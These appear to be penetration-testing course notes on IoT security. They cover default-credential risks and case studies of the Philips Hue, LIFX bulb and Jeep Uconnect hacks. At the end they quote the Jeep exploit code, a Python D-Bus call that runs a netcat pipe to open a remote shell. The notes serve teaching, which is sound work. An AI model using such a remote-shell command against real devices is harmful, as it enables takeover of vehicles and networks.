# IoT Penetration Testing  

#### Objective:  
- Establish a process for assessing IoT devices 
- Extract firmware from devices 
- Mount and run a firmware image 
- Explore IoT exploitation

## IoT Attacks and Threats  
### IoT  
Like anything else, the Internet of Things (IoT) is connected via a network interface. The most common method is a Layer 3 access that is via an IP address, then each device like any node on the network has an attack surface, this is represented by a port which is a Layer 4 interface, this is the same as any other target we go up against. These ports provide us a possible method of access, depending on how the device is setup. The problem is many of these devices have been designed and manufactured with default services running and the default configuration settings. Just as in the past, the manufactures placed these devices into circulation with ports and default credentials. This is how the Mirai botnet came to pass. Their home devices and everything else should be following the best practices principle of least services and privileges, like anything else. It is our job as testers to validate that the devices are not placed on the network with these weak configurations and do not present a vector for an attacker to leverage what is there as an attack surface that had not been changed from the defaults or at least modified to make the device a more challenging target.

### Popular IoT Hacks  
This is just a shortlist, there are so many different examples of these types of hacks, and they all have similar characteristics, that is an attack surface and poor design or weak configuration. This is our job as testers, and we have to map this and see what is there, so our clients know what risk they have added to their network. As has been stated, these are all devices that have some type of client-server interaction, and as a result of that, there is an opportunity to leverage and attack this interaction.

### Phillips Smart Home  
- Multiple weaknesses
- Hue Worm
  - Leveraged the **weakness of hard coded symmetric keys**
- Blackouts
  - Authentication provided by the **MD5 hash** of the MAC address
    - Trivial to provide as authentication
    - Led to the ability to continually turn the bulb off and cause a permanent blackout
 
When we review the weaknesses discovered in the Phillips Smart Home, once again, we see some basic tenets of security not being followed. Hardcoded encryption keys are not a good security practice, and the fact that they were used in more than one place is another problem with the design. 

The usage of a MAC address for authentication is not anything that follows best practices either.

### LIFX Smart Bulb  
- Serious vulnerabilities discovered
- Packet injection
- Compromised Wi-Fi credentials
- Take over bulbs without providing any authentication

This is an older example, but once again, it is the same premise as before, not following best practices and using poor methods of security. The communication between the devices was encrypted, which provided some forms of protection. In a traditional pentest, we would be at the mercy of attempting to decrypt this traffic, but within an IoT device pentest we have other methods we can use, for example, we want to look at this in its entirety, and we can do this by examining the firmware of the device, so we can determine how the packets are getting encrypted. The challenge in IoT testing is determining how to extract the firmware. In the case of Lifx bulbs, JTAG gave access to the Lifx firmware, which when reversed led to the identification of the type of encryption, which in this case was Advanced Encryption Standard (AES), the encryption key, the initialization vector, and the block mode used for encryption. Because this information would have been the same for all the Lifx smart bulbs, an attacker could take control of any light bulb and break into the Wi-Fi because the device was also communicating the Wi-Fi credentials over the radio network, which could now be decrypted.
 
### The Jeep Hack  
- Well publicized attack
- Took control of the Jeep via **weak remote access** attack surface
- Vulnerabilities were in the **Chrysler Uconnect system**
- Open port with anonymous authentication

This is one of the most well-known attacks, but when the remote access vector of a protocol is open with anonymous authentication, we once again see a blatant example of when the manufactures are not even putting in the most basics of protection, the screenshot is the exploit code from the official white paper of the attack. As you review the code, you see how simple this is and moreover, how weak this has been configured by the manufacturer, to allow access via a port and provide a vector where we can use a basic python module and string to connect to a bus and provide code, well nothing else needs to be said, this is notoriously weak. Once arbitrary command execution was gained, it was possible to perform a lateral movement and send CAN messages taking control of the various elements of the vehicle, such as the steering wheel, brakes, headlights, and so on. The famous picture was when they sent the kill signal, and the Jeep was at the side of the road and completely disabled.

#### Jeep hack exploit code:  
```python
#!python
import dbus
bus_obj=dbus.bus.BusConnection("tcp:host=192.168.5.,port=6667")
proxy_object=bus_obj.get_object('com.harman.service.NavTrailService','com/harman/service/NavTrailService')
playerengine_iface=dbus.Interface(proxy_object,dbus_iterface='com.harman.ServiceIpc')
print playerengine_iface.Invoke('execute','{"cmd":"netcat -l -p 6666 | /bin/sh | netcat 192.168.5.109 6666"}')
```
